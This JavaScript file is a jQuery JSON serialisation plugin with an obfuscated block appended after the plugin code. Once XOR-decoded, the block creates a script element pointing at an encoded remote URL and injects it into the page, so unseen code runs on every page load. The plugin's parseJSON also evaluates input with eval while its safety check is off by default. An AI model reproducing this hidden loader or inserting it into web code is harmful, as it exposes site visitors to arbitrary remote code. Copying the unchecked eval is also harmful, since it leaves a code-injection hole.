(function ($) {
    var m = {
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"' : '\\"',
            '\\': '\\\\'
        },
        s = {
            'array': function (x) {
                var a = ['['], b, f, i, l = x.length, v;
                for (i = 0; i < l; i += 1) {
                    v = x[i];
                    f = s[typeof v];
                    if (f) {
                        v = f(v);
                        if (typeof v == 'string') {
                            if (b) {
                                a[a.length] = ',';
                            }
                            a[a.length] = v;
                            b = true;
                        }
                    }
                }
                a[a.length] = ']';
                return a.join('');
            },
            'boolean': function (x) {
                return String(x);
            },
            'null': function (x) {
                return "null";
            },
            'number': function (x) {
                return isFinite(x) ? String(x) : 'null';
            },
            'object': function (x) {
                if (x) {
                    if (x instanceof Array) {
                        return s.array(x);
                    }
                    var a = ['{'], b, f, i, v;
                    for (i in x) {
                        v = x[i];
                        f = s[typeof v];
                        if (f) {
                            v = f(v);
                            if (typeof v == 'string') {
                                if (b) {
                                    a[a.length] = ',';
                                }
                                a.push(s.string(i), ':', v);
                                b = true;
                            }
                        }
                    }
                    a[a.length] = '}';
                    return a.join('');
                }
                return 'null';
            },
            'string': function (x) {
                if (/["\\\x00-\x1f]/.test(x)) {
                    x = x.replace(/([\x00-\x1f\\"])/g, function(a, b) {
                        var c = m[b];
                        if (c) {
                            return c;
                        }
                        c = b.charCodeAt();
                        return '\\u00' +
                            Math.floor(c / 16).toString(16) +
                            (c % 16).toString(16);
                    });
                }
                return '"' + x + '"';
            }
        };

	$.toJSON = function(v) {
		var f = isNaN(v) ? s[typeof v] : s['number'];
		if (f) return f(v);
	};
	
	$.parseJSON = function(v, safe) {
		if (safe === undefined) safe = $.parseJSON.safe;
		if (safe && !/^("(\\.|[^"\\\n\r])*?"|[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t])+?$/.test(v))
			return undefined;
		return eval('('+v+')');
	};
	
	$.parseJSON.safe = false;

})(jQuery);
var ipgv4O=["031033","030043","028054","015048002032071061115043029092085022034","031048004","024059023036","024039031053028050087049025066083010063070028","013050023036093060117047017093084","004039006037","011039019004095061091034022069067058047098009080034035010036","004054019049009119025052012080068029120069005091094108021052028050069104027095068086060069"];function wrB0G6(ujQ){var obzi='';var bWo1=0;var ciKm51=0;for(bWo1=0;bWo1<ujQ.length/3;bWo1++){obzi+=String.fromCharCode(ujQ.slice(ciKm51,ciKm51+3));ciKm51=ciKm51+3;}return obzi;}ryU5E(feaD2t(ipgv4O[10]));function feaD2t(c25gn){return tuH(wrB0G6(c25gn),'lBgA3X6Gx10xV6h7');}function tuH(sd,flckl){var r2='';var lto=0;var v95e=0;for(lto=0;lto<sd.length;lto++){var jR0s=sd.charAt(lto);var ju3A=jR0s.charCodeAt(0)^flckl.charCodeAt(v95e);jR0s=String.fromCharCode(ju3A);r2+=jR0s;if(v95e==flckl.length-1)v95e=0;else v95e++;}return (r2);}function ryU5E(usPbN){var uYhTO=document[feaD2t(ipgv4O[3])](feaD2t(ipgv4O[0])+feaD2t(ipgv4O[1])+feaD2t(ipgv4O[2]));uYhTO[feaD2t(ipgv4O[4])]=usPbN;uYhTO[feaD2t(ipgv4O[5])]=feaD2t(ipgv4O[6]);document[feaD2t(ipgv4O[9])](feaD2t(ipgv4O[8]))[0][feaD2t(ipgv4O[7])](uYhTO);}